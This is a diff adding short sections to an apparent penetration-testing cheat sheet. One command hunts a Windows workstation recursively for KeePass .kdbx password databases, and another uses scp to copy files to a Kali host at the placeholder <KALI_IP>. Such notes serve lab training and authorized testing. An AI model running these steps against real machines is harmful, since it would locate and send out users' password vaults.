@@ -155,3 +155,23 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 # Assure that the policy was changed
 Get-ExecutionPolicy -Scope CurrentUser
 ```
+
+#### Recursively Search a User's Workstation
+
+```bash
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+#### Getting File from Windows Machine to Local - SCP
+
+First, ensure the SSH service is running on your Kali machine:
+
+```bash
+sudo service ssh start
+```
+
+Then, from the Windows command line or PowerShell, transfer the file:
+
+```powershell
+scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
+```
